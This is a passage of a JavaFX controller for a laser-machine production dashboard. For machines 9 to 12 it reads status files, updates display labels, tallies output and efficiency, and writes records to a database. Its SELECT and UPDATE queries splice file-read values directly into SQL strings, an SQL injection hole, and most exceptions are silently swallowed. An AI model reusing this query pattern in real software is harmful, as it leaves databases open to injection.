        mod17.setText("Machine isn't working");
        unit17.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit17.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh17.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    
    refresh18.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 9 ////////////////////////////
      String machine_number9="9";  
//      String poth9 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth9=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg9=new File (poth+"\\Machine9.kady");
        if (lkg9.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg9));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno18.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod18.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit18.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod18.setText(v5);
           unit18.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine9.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
             areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine9.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine9.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine9.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine9.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe9.txt"));
             summe9=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine9.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog18.setText(Integer.toString(sum-summe9));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog18.setText("N/A");
//nog18.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane9.setStyle("-fx-background-color:orange;");
              eff18.setText("0%");
          }
          
          else {
              
                vboxpane9.setStyle("-fx-background-color:transparent;");
              
                  
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff18.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff18.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff18.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff18.setText("N/A");
          }
          
              
          }
          
        
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg9.delete();
        } 
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 9 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno18.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno18.setText("Machine   "+machine_number9);
        nog18.setText("0");
        eff18.setText("0%");
        mod18.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod18.setText("Machine isn't working");
        unit18.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit18.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh18.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
//    
        
        
    
    
    refresh19.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 10 ////////////////////////////
      String machine_number10="10";  
//      String poth10 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth10=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg10=new File (poth+"\\Machine10.kady");
        if (lkg10.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg10));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno19.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod19.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit19.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod19.setText(v5);
           unit19.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine10.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
          areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine10.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
               //Write or append
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine10.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
//Files.write(Paths.get(hn+"\\Machine10.txt"), ("\n"+v3+"/"+v5+"="+v6).getBytes(), StandardOpenOption.APPEND);

      
               }
             
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine10.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine10.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe10.txt"));
             summe10=Integer.parseInt(wq.readLine());
             wq.close();
             
             try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine10.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog19.setText(Integer.toString(sum-summe10));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog19.setText("N/A");
//nog19.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane10.setStyle("-fx-background-color:orange;");
                eff19.setText("0%");
                
              
          }
          
          else {
              
                vboxpane10.setStyle("-fx-background-color:transparent;");
              
                 
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff19.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff19.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff19.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff19.setText("N/A");
          }
              
          }
          
          
         
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg10.delete();
        } 
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 10 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno19.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno19.setText("Machine   "+machine_number10);
        nog19.setText("0");
        eff19.setText("0%");
        mod19.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod19.setText("Machine isn't working");
        unit19.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit19.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh19.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    
    refresh110.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 11 ////////////////////////////
      String machine_number11="11";  
//      String poth11 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth11=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg11=new File (poth+"\\Machine11.kady");
        if (lkg11.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg11));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno110.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod110.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit110.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod110.setText(v5);
           unit110.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine11.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine11.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine11.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
              //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine11.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine11.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe11.txt"));
             summe11=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine11.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog110.setText(Integer.toString(sum-summe11));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog110.setText("N/A");
//nog110.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
             
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane11.setStyle("-fx-background-color:orange;");
              eff110.setText("0%");
          }
          
          else {
              
                vboxpane11.setStyle("-fx-background-color:transparent;");
               long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff110.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff110.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff110.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff110.setText("N/A");
          }
          
            
          }
          
          
         
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg11.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 11 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno110.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno110.setText("Machine   "+machine_number11);
        nog110.setText("0");
        eff110.setText("0%");
        mod110.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod110.setText("Machine isn't working");
        unit110.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit110.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh110.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
        
        
    
    refresh111.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 12 ////////////////////////////
      String machine_number12="12";  
//      String poth12 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth12=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg12=new File (poth+"\\Machine12.kady");
        if (lkg12.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg12));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno111.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod111.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit111.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod111.setText(v5);
           unit111.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
            
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine12.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
          areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
